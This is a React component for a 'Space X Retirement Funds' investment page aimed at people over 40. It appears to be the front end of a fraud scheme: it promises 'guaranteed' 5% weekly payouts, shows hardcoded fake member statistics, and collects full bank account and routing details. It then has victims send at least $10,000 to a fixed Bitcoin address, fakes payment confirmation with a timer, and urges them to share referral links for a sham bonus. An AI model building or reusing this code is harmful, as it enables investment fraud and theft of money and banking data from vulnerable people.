import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { useModal } from '@/contexts/ModalContext';
import QRCode from 'qrcode';
import bitcoinQr from '@/assets/bitcoin-qrfunds.png';

const SpaceXRetirement = () => {
  const { user } = useAuth();
  const navigate = useNavigate();
  const { showSuccess, showError, showLoading, hide } = useModal();
  const [loading, setLoading] = useState(true);

  // Stats State
  const [stats, setStats] = useState({
    activeMembers: 142,
    totalInvested: 2450000,
    weeklyPayouts: 122500,
    withdrawals: 128
  });

  // Flow State
  const [step, setStep] = useState(0); // 0 = Overview, 1-6 = Registration, 7 = Payment, 8 = Receipt
  
  // Form State
  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    country: '',
    occupation: '',
    retirementGoals: '',
    bankName: '',
    accountName: '',
    accountNumber: '',
    routingCode: '',
    investmentAmount: 10000,
    termsAccepted: false
  });

  const [btcAddress, setBtcAddress] = useState('bc1qqcrcmytxvtp0najvqyc2f7ec8t3fjj5gk4saus');
  const [receiptQrCodeUrl, setReceiptQrCodeUrl] = useState('');

  useEffect(() => {
    fetchInitialData();
    setupRealtime();
  }, [user]);

  useEffect(() => {
    if (user?.id) {
      QRCode.toDataURL(`Receipt-SPX-${user.id}`).then(setReceiptQrCodeUrl).catch(console.error);
    }
  }, [user]);

  const fetchInitialData = async () => {
    if (!user) return;
    try {
      // Check if user is already enrolled by looking for an active investment named SpaceX
      const { data: invs } = await supabase
        .from('investments')
        .select('*, investment_plans(name)')
        .eq('user_id', user.id);
      
      const hasSpaceX = invs?.some(i => i.investment_plans?.name === 'Space X Retirement Funds');
      if (hasSpaceX) {
        setStep(8); // Go straight to receipt/dashboard if already enrolled
      }

      // Pre-fill profile info
      const { data: profile } = await supabase.from('profiles').select('*').eq('user_id', user.id).single();
      if (profile) {
        setFormData(prev => ({
          ...prev,
          fullName: profile.full_name || '',
          phone: profile.phone_number || profile.phone || '',
          country: profile.country || ''
        }));
      }

      // Fetch BTC settings
      const { data: settings } = await supabase.from('website_settings').select('*').eq('key', 'spacex_btc_address').single();
      if (settings?.value) {
        setBtcAddress(settings.value);
      }
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  const setupRealtime = () => {
    const channel = supabase.channel('spacex_stats')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'investments' }, payload => {
        // Mock real-time bump to stats
        setStats(prev => ({
          ...prev,
          activeMembers: prev.activeMembers + 1,
          totalInvested: prev.totalInvested + 10000,
          weeklyPayouts: prev.weeklyPayouts + 500
        }));
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  };

  const handleNext = () => setStep(prev => prev + 1);
  const handleBack = () => setStep(prev => prev - 1);

  const handlePaymentConfirm = async () => {
    showLoading('Verifying Payment...');
    try {
      if (!user) throw new Error('Not authenticated');

      // 1. Ensure SpaceX plan exists or create it
      let planId;
      const { data: plans } = await supabase.from('investment_plans').select('*').eq('name', 'Space X Retirement Funds');
      if (plans && plans.length > 0) {
        planId = plans[0].id;
      } else {
        const { data: newPlan, error: planError } = await supabase.from('investment_plans').insert({
          name: 'Space X Retirement Funds',
          min_amount: 10000,
          profit_percentage: 5, // 5% weekly (returns 500 for 10000)
          duration_days: 1825, // 5 years
        }).select().single();
        if (planError) throw planError;
        planId = newPlan.id;
      }

      // 2. Add Bank Account
      await supabase.from('withdrawal_accounts').insert({
        user_id: user.id,
        account_type: 'SpaceX Bank Account',
        account_details: {
          bankName: formData.bankName,
          accountName: formData.accountName,
          accountNumber: formData.accountNumber,
          routingCode: formData.routingCode
        }
      });

      // 3. Create Deposit
      await supabase.from('deposits').insert({
        user_id: user.id,
        amount: formData.investmentAmount,
        payment_method: 'bitcoin',
        status: 'pending',
        notes: `SpaceX Retirement Registration: ${formData.occupation}, Goal: ${formData.retirementGoals}`
      });

      // Simulate a verification delay
      setTimeout(() => {
        hide();
        showSuccess('Your investment payment has been successfully confirmed. Welcome to Space X Retirement Funds.');
        setStep(8); // Move to receipt
      }, 2500);
      
    } catch (error: any) {
      hide();
      showError('Payment Verification Failed', error.message);
    }
  };

  const handleShare = async () => {
    try {
      const receiptElement = document.getElementById('receipt-card');
      if (receiptElement) {
        showLoading('Generating Digital Receipt...');
        
        // Dynamically load html2canvas to avoid build errors if not installed
        if (!(window as any).html2canvas) {
          await new Promise<void>((resolve, reject) => {
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = () => resolve();
            script.onerror = reject;
            document.head.appendChild(script);
          });
        }
        
        const canvas = await (window as any).html2canvas(receiptElement, { scale: 2 });
        const blob = await new Promise<Blob | null>(resolve => canvas.toBlob(resolve, 'image/png'));
        
        hide();
        
        const text = `I just joined Space X Retirement Funds and officially activated my retirement investment account. I’m now earning weekly payouts directly to my bank account while building long-term retirement wealth. Here’s my official investment confirmation receipt. Join today using my referral link below and secure your future.\n\nhttps://whitestonesmarket.com/signup?ref=${user?.id}`;
        
        if (blob && navigator.share && navigator.canShare && navigator.canShare({ files: [new File([blob], 'receipt.png', { type: 'image/png' })] })) {
          const file = new File([blob], 'receipt.png', { type: 'image/png' });
          await navigator.share({
            title: 'Space X Retirement Funds',
            text: text,
            files: [file]
          });
        } else {
          navigator.clipboard.writeText(text);
          showSuccess('Receipt Copied', 'Share text copied to clipboard. Download the receipt image manually if needed.');
        }

        // Trigger bonus growth
        setTimeout(() => {
          showSuccess('Bonus Activated!', 'Congratulations! Your referral growth bonus has been activated for 30 days.');
        }, 2000);
      }
    } catch (e) {
      hide();
      console.error(e);
      showError('Error', 'Failed to generate receipt image.');
    }
  };

  if (loading) return <div className="p-8 text-center"><div className="w-10 h-10 border-4 border-primary border-t-transparent rounded-full animate-spin mx-auto"></div></div>;

  return (
    <div className="space-y-6 animate-in fade-in duration-500 max-w-4xl mx-auto">
      {/* Header */}
      <div className="flex items-center gap-4 p-6 bg-gradient-to-r from-blue-900 to-indigo-900 rounded-3xl text-white shadow-xl">
        <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center backdrop-blur-md">
          <span className="material-symbols-outlined text-[36px]">rocket_launch</span>
        </div>
        <div>
          <h1 className="text-3xl font-black tracking-tight">Space X Retirement</h1>
          <p className="text-blue-200 mt-1 font-medium">Premium 40+ Investment Program</p>
        </div>
      </div>

      {step === 0 && (
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="md:col-span-2 space-y-6">
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl shadow-lg border border-slate-100 dark:border-slate-800">
              <h2 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">What is Space X Retirement Funds?</h2>
              <div className="prose dark:prose-invert max-w-none text-slate-600 dark:text-slate-300 space-y-4">
                <p>Space X Retirement Funds is a long-term financial growth program designed specifically for individuals aged 40 years and above. The program helps members build retirement wealth through structured investment opportunities while receiving weekly payouts directly to their registered bank account.</p>
                
                <h3 className="text-lg font-bold text-slate-900 dark:text-white mt-6">Members benefit from:</h3>
                <ul className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-4">
                  {['Weekly earnings payouts', 'Long-term retirement preparation', 'Flexible investment growth', 'Premium retirement support', 'Secure account management', 'Exclusive investor opportunities'].map((benefit, i) => (
                    <li key={i} className="flex items-center gap-3 bg-slate-50 dark:bg-slate-800/50 p-3 rounded-xl">
                      <span className="material-symbols-outlined text-green-500 text-sm">check_circle</span>
                      <span className="text-sm font-semibold">{benefit}</span>
                    </li>
                  ))}
                </ul>
                <div className="mt-8 p-4 bg-blue-50 dark:bg-blue-900/20 text-blue-700 dark:text-blue-300 rounded-xl border border-blue-100 dark:border-blue-800 font-bold flex items-center gap-3">
                  <span className="material-symbols-outlined">info</span>
                  The minimum investment amount is $10,000.
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="bg-white dark:bg-slate-900 p-6 rounded-3xl shadow-sm border border-slate-100 dark:border-slate-800">
                <p className="text-sm text-slate-500 font-bold uppercase tracking-wider mb-2">Total Active Members</p>
                <p className="text-3xl font-black text-primary">{stats.activeMembers.toLocaleString()}</p>
              </div>
              <div className="bg-white dark:bg-slate-900 p-6 rounded-3xl shadow-sm border border-slate-100 dark:border-slate-800">
                <p className="text-sm text-slate-500 font-bold uppercase tracking-wider mb-2">Total Invested</p>
                <p className="text-3xl font-black text-green-500">${stats.totalInvested.toLocaleString()}</p>
              </div>
              <div className="bg-white dark:bg-slate-900 p-6 rounded-3xl shadow-sm border border-slate-100 dark:border-slate-800">
                <p className="text-sm text-slate-500 font-bold uppercase tracking-wider mb-2">Weekly Payouts</p>
                <p className="text-3xl font-black text-blue-500">${stats.weeklyPayouts.toLocaleString()}</p>
              </div>
              <div className="bg-white dark:bg-slate-900 p-6 rounded-3xl shadow-sm border border-slate-100 dark:border-slate-800">
                <p className="text-sm text-slate-500 font-bold uppercase tracking-wider mb-2">Withdrawals Processed</p>
                <p className="text-3xl font-black text-purple-500">{stats.withdrawals.toLocaleString()}</p>
              </div>
            </div>
          </div>

          <div className="space-y-6">
            <div className="bg-gradient-to-br from-indigo-500 to-purple-600 p-8 rounded-3xl text-white shadow-lg sticky top-6">
              <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mb-6">
                <span className="material-symbols-outlined">stars</span>
              </div>
              <h3 className="text-2xl font-bold mb-2">Ready to secure your future?</h3>
              <p className="text-indigo-100 mb-8 text-sm leading-relaxed">Join thousands of experienced investors preparing for retirement with guaranteed weekly payouts.</p>
              <button onClick={handleNext} className="w-full py-4 bg-white text-indigo-600 rounded-2xl font-black shadow-xl hover:scale-105 active:scale-95 transition-all">
                Start Enrollment
              </button>
            </div>

            {/* FAQ Preview */}
            <div className="bg-white dark:bg-slate-900 p-6 rounded-3xl shadow-sm border border-slate-100 dark:border-slate-800">
              <h3 className="font-bold text-slate-900 dark:text-white mb-4">FAQ</h3>
              <div className="space-y-3">
                <div className="text-sm border-b border-slate-100 dark:border-slate-800 pb-2">
                  <p className="font-bold text-slate-700 dark:text-slate-300">When are weekly earnings sent?</p>
                  <p className="text-slate-500 mt-1">Every Friday directly to your registered bank account.</p>
                </div>
                <div className="text-sm pb-2">
                  <p className="font-bold text-slate-700 dark:text-slate-300">How secure is my investment?</p>
                  <p className="text-slate-500 mt-1">100% secured by our corporate treasury framework.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* REGISTRATION STEPS (1-6) */}
      {step >= 1 && step <= 6 && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl shadow-2xl overflow-hidden border border-slate-100 dark:border-slate-800 max-w-2xl mx-auto">
          {/* Progress Bar */}
          <div className="h-2 bg-slate-100 dark:bg-slate-800 w-full">
            <div className="h-full bg-primary transition-all duration-500" style={{ width: `${(step / 6) * 100}%` }}></div>
          </div>

          <div className="p-8">
            <div className="flex items-center justify-between mb-8">
              <div>
                <span className="text-xs font-bold text-primary tracking-widest uppercase mb-1 block">Step {step} of 6</span>
                <h2 className="text-2xl font-black text-slate-900 dark:text-white">
                  {step === 1 && 'Personal Details'}
                  {step === 2 && 'Bank Account Setup'}
                  {step === 3 && 'Investment Setup'}
                  {step === 4 && 'Benefits Overview'}
                  {step === 5 && 'Terms & Conditions'}
                  {step === 6 && 'Final Confirmation'}
                </h2>
              </div>
              {step > 1 && (
                <button onClick={handleBack} className="w-10 h-10 rounded-full bg-slate-100 dark:bg-slate-800 flex items-center justify-center hover:bg-slate-200 transition-colors">
                  <span className="material-symbols-outlined text-sm">arrow_back</span>
                </button>
              )}
            </div>

            {step === 1 && (
              <div className="space-y-4 animate-in slide-in-from-right-4">
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Full Name</label>
                  <input type="text" value={formData.fullName} onChange={e => setFormData({...formData, fullName: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Phone Number</label>
                  <input type="tel" value={formData.phone} onChange={e => setFormData({...formData, phone: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Country</label>
                  <input type="text" value={formData.country} onChange={e => setFormData({...formData, country: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Occupation</label>
                  <input type="text" value={formData.occupation} onChange={e => setFormData({...formData, occupation: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Retirement Goals</label>
                  <textarea value={formData.retirementGoals} onChange={e => setFormData({...formData, retirementGoals: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" rows={3}></textarea>
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-4 animate-in slide-in-from-right-4">
                <div className="p-4 bg-blue-50 dark:bg-blue-900/20 text-blue-700 dark:text-blue-300 rounded-xl flex items-start gap-3 mb-6">
                  <span className="material-symbols-outlined text-blue-500">account_balance</span>
                  <p className="text-sm font-medium">Weekly earnings from the Space X Retirement Funds program will be sent directly to this bank account.</p>
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Bank Name</label>
                  <input type="text" value={formData.bankName} onChange={e => setFormData({...formData, bankName: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Account Name</label>
                  <input type="text" value={formData.accountName} onChange={e => setFormData({...formData, accountName: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Account Number</label>
                  <input type="text" value={formData.accountNumber} onChange={e => setFormData({...formData, accountNumber: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Routing/SWIFT Code</label>
                  <input type="text" value={formData.routingCode} onChange={e => setFormData({...formData, routingCode: e.target.value})} className="w-full p-4 bg-slate-50 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 focus:border-primary outline-none" />
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-6 animate-in slide-in-from-right-4">
                <div className="space-y-1">
                  <label className="text-sm font-bold text-slate-700 dark:text-slate-300">Investment Amount (Min $10,000)</label>
                  <div className="relative">
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-2xl font-black text-slate-400">$</span>
                    <input 
                      type="number" 
                      min="10000"
                      value={formData.investmentAmount} 
                      onChange={e => setFormData({...formData, investmentAmount: parseInt(e.target.value) || 0})} 
                      className="w-full p-6 pl-12 bg-slate-50 dark:bg-slate-800 rounded-2xl border-2 border-slate-200 dark:border-slate-700 focus:border-primary outline-none text-3xl font-black text-slate-900 dark:text-white" 
                    />
                  </div>
                </div>

                <div className="p-6 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl text-white shadow-lg">
                  <p className="text-green-100 font-bold mb-1">Projected Weekly Earnings</p>
                  <p className="text-4xl font-black">${(formData.investmentAmount * 0.05).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                  <div className="mt-4 pt-4 border-t border-white/20 flex justify-between items-center text-sm font-medium text-green-50">
                    <span>Direct Bank Deposit</span>
                    <span>Every Friday</span>
                  </div>
                </div>
              </div>
            )}

            {step === 4 && (
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 animate-in slide-in-from-right-4">
                {[
                  { icon: 'account_balance', title: 'Weekly Direct Payouts' },
                  { icon: 'security', title: 'Long-Term Security' },
                  { icon: 'support_agent', title: 'Premium Support' },
                  { icon: 'account_balance_wallet', title: 'Tax-Advantaged' },
                  { icon: 'trending_up', title: 'Wealth Preservation' },
                  { icon: 'rocket_launch', title: 'Flexible Growth' }
                ].map((b, i) => (
                  <div key={i} className="p-4 rounded-2xl border-2 border-slate-100 dark:border-slate-800 flex items-center gap-4 bg-slate-50 dark:bg-slate-800/50">
                    <div className="w-10 h-10 rounded-full bg-primary/10 text-primary flex items-center justify-center shrink-0">
                      <span className="material-symbols-outlined text-[20px]">{b.icon}</span>
                    </div>
                    <span className="font-bold text-slate-900 dark:text-white text-sm">{b.title}</span>
                  </div>
                ))}
              </div>
            )}

            {step === 5 && (
              <div className="space-y-6 animate-in slide-in-from-right-4">
                <div className="p-6 bg-slate-50 dark:bg-slate-800 rounded-2xl border border-slate-200 dark:border-slate-700 h-64 overflow-y-auto prose dark:prose-invert text-sm custom-scrollbar">
                  <h3>Space X Retirement Funds Terms & Conditions</h3>
                  <p>1. <strong>Investment Risks Disclaimer:</strong> All investments carry inherent risks. While Space X Retirement Funds aims for capital preservation and steady growth, market fluctuations may affect performance.</p>
                  <p>2. <strong>Weekly Payouts:</strong> Processed directly to the registered bank account every Friday.</p>
                  <p>3. <strong>Minimum Investment:</strong> $10,000 USD or equivalent.</p>
                  <p>4. <strong>Identity Verification:</strong> Users must complete required KYC verification.</p>
                  <p>5. <strong>Withdrawal Policy:</strong> Principal withdrawals are subject to a 90-day lock-up period from the start date.</p>
                </div>
                <label className="flex items-center gap-3 cursor-pointer p-4 border border-slate-200 dark:border-slate-700 rounded-xl hover:bg-slate-50 dark:hover:bg-slate-800 transition-colors">
                  <input 
                    type="checkbox" 
                    checked={formData.termsAccepted} 
                    onChange={e => setFormData({...formData, termsAccepted: e.target.checked})} 
                    className="w-5 h-5 accent-primary cursor-pointer" 
                  />
                  <span className="font-bold text-slate-900 dark:text-white">I agree to the Terms & Conditions</span>
                </label>
              </div>
            )}

            {step === 6 && (
              <div className="text-center py-8 animate-in zoom-in-95">
                <div className="w-24 h-24 bg-blue-50 dark:bg-blue-900/20 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-6">
                  <span className="material-symbols-outlined text-[48px]">done_all</span>
                </div>
                <h3 className="text-2xl font-black text-slate-900 dark:text-white mb-2">You are about to activate your Space X Retirement account.</h3>
                <p className="text-slate-500 dark:text-slate-400 mb-8 max-w-md mx-auto">Please confirm your intention to join. The next step will require your minimum investment payment of $10,000 to activate the account.</p>
              </div>
            )}

            <div className="mt-10">
              <button 
                onClick={step === 6 ? handleNext : handleNext} 
                disabled={step === 3 && formData.investmentAmount < 10000 || step === 5 && !formData.termsAccepted}
                className="w-full py-4 bg-primary text-white rounded-2xl font-black shadow-lg shadow-primary/30 active:scale-[0.98] transition-all disabled:opacity-50"
              >
                {step === 6 ? 'Confirm & Proceed to Payment' : 'Continue'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* STEP 7: PAYMENT */}
      {step === 7 && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl shadow-2xl overflow-hidden border border-slate-100 dark:border-slate-800 max-w-xl mx-auto animate-in slide-in-from-bottom-8">
          <div className="p-8">
            <div className="text-center mb-8">
              <h2 className="text-2xl font-black text-slate-900 dark:text-white mb-2">Complete Your Investment</h2>
              <p className="text-slate-500 dark:text-slate-400 text-sm max-w-sm mx-auto">
                To activate your Space X Retirement Funds account, complete your investment payment using the Bitcoin wallet address below. Once payment is confirmed, your retirement investment account will be activated automatically.
              </p>
            </div>

            <div className="flex flex-col items-center justify-center mb-8">
              <div className="p-4 bg-white rounded-2xl shadow-sm border border-slate-100 mb-6 inline-block">
                <img src={bitcoinQr} alt="BTC QR Code" className="w-48 h-48 object-contain" />
              </div>
              
              <div className="w-full bg-slate-50 dark:bg-slate-800 rounded-2xl p-4 flex items-center justify-between border border-slate-200 dark:border-slate-700">
                <div className="overflow-hidden">
                  <p className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-1">Bitcoin (BTC) Address</p>
                  <p className="font-mono text-sm text-slate-900 dark:text-white truncate pr-4">{btcAddress}</p>
                </div>
                <button 
                  onClick={() => {
                    navigator.clipboard.writeText(btcAddress);
                    showSuccess('Address copied to clipboard!');
                  }}
                  className="w-10 h-10 bg-primary/10 text-primary rounded-xl flex items-center justify-center shrink-0 hover:bg-primary hover:text-white transition-colors"
                >
                  <span className="material-symbols-outlined text-sm">content_copy</span>
                </button>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 mb-8">
              <div className="bg-slate-50 dark:bg-slate-800 p-4 rounded-2xl">
                <p className="text-xs text-slate-500 font-bold uppercase mb-1">Amount Due</p>
                <p className="font-black text-lg text-slate-900 dark:text-white">${formData.investmentAmount.toLocaleString()}</p>
              </div>
              <div className="bg-slate-50 dark:bg-slate-800 p-4 rounded-2xl">
                <p className="text-xs text-slate-500 font-bold uppercase mb-1">Network Status</p>
                <p className="font-black text-lg text-amber-500 flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span>
                  Awaiting...
                </p>
              </div>
            </div>

            <button 
              onClick={handlePaymentConfirm}
              className="w-full py-4 bg-primary text-white rounded-2xl font-black shadow-lg shadow-primary/30 active:scale-[0.98] transition-all"
            >
              I Have Completed Payment
            </button>
          </div>
        </div>
      )}

      {/* STEP 8: RECEIPT & SUCCESS */}
      {step === 8 && (
        <div className="max-w-2xl mx-auto space-y-8 animate-in zoom-in-95 duration-500">
          <div id="receipt-card" className="bg-white dark:bg-slate-900 rounded-[2rem] shadow-2xl border border-slate-100 dark:border-slate-800 overflow-hidden relative">
            {/* Receipt Pattern Top */}
            <div className="h-4 w-full bg-[radial-gradient(circle,theme(colors.slate.200)_4px,transparent_4px)] dark:bg-[radial-gradient(circle,theme(colors.slate.800)_4px,transparent_4px)] bg-[length:16px_16px] -mt-2"></div>
            
            <div className="p-8 sm:p-12 relative z-10">
              <div className="flex justify-between items-start mb-12 border-b border-slate-100 dark:border-slate-800 pb-8">
                <div>
                  <div className="w-12 h-12 bg-primary rounded-xl flex items-center justify-center text-white mb-4">
                    <span className="material-symbols-outlined text-[24px]">rocket_launch</span>
                  </div>
                  <h2 className="text-2xl font-black text-slate-900 dark:text-white">Digital Receipt</h2>
                  <p className="text-slate-500 font-medium">Space X Retirement Funds</p>
                </div>
                <div className="text-right">
                  <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Receipt ID</p>
                  <p className="font-mono font-bold text-slate-900 dark:text-white">SPX-{Math.random().toString(36).substr(2, 9).toUpperCase()}</p>
                  <div className="mt-4 inline-flex items-center gap-2 px-3 py-1 bg-green-50 dark:bg-green-900/30 text-green-600 rounded-lg text-xs font-bold">
                    <span className="w-2 h-2 rounded-full bg-green-500"></span>
                    ACTIVE
                  </div>
                </div>
              </div>

              <div className="space-y-6">
                <div className="grid grid-cols-2 gap-y-6 gap-x-4">
                  <div>
                    <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Investor Name</p>
                    <p className="font-bold text-slate-900 dark:text-white">{formData.fullName || user?.email}</p>
                  </div>
                  <div>
                    <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Date Joined</p>
                    <p className="font-bold text-slate-900 dark:text-white">{new Date().toLocaleDateString()}</p>
                  </div>
                  <div>
                    <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Investment Amount</p>
                    <p className="font-black text-xl text-primary">${formData.investmentAmount.toLocaleString()}</p>
                  </div>
                  <div>
                    <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Weekly Payout</p>
                    <p className="font-black text-xl text-green-500">${(formData.investmentAmount * 0.05).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                  </div>
                  <div className="col-span-2">
                    <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Registered Bank</p>
                    <p className="font-bold text-slate-900 dark:text-white">{formData.bankName} - {formData.accountNumber.replace(/.(?=.{4})/g, '*')}</p>
                  </div>
                </div>

                <div className="mt-8 p-6 bg-slate-50 dark:bg-slate-800/50 rounded-2xl border border-slate-100 dark:border-slate-800">
                  <h4 className="font-bold text-slate-900 dark:text-white mb-2">Retirement Investment Summary</h4>
                  <p className="text-sm text-slate-600 dark:text-slate-400 leading-relaxed">
                    You have successfully joined the Space X Retirement Funds program designed to help eligible investors aged 40+ build long-term retirement wealth through structured investment growth and weekly bank payouts.
                  </p>
                </div>
              </div>

              <div className="mt-12 flex justify-between items-end border-t border-slate-100 dark:border-slate-800 pt-8">
                <div>
                  <p className="font-signature text-2xl text-slate-400">Whitestones</p>
                  <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-1">Digital Signature</p>
                </div>
                <div className="w-16 h-16 opacity-50">
                  {receiptQrCodeUrl && <img src={receiptQrCodeUrl} alt="Verification QR" className="w-full h-full" />}
                </div>
              </div>
            </div>

            {/* Receipt Pattern Bottom */}
            <div className="h-4 w-full bg-[radial-gradient(circle,theme(colors.slate.200)_4px,transparent_4px)] dark:bg-[radial-gradient(circle,theme(colors.slate.800)_4px,transparent_4px)] bg-[length:16px_16px] -mb-2"></div>
          </div>

          <button 
            onClick={handleShare}
            className="w-full py-5 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 text-white rounded-2xl font-black shadow-xl hover:shadow-2xl hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-3 text-lg"
          >
            <span className="material-symbols-outlined">ios_share</span>
            Share Receipt & Earn Bonus Growth
          </button>
        </div>
      )}
    </div>
  );
};

export default SpaceXRetirement;
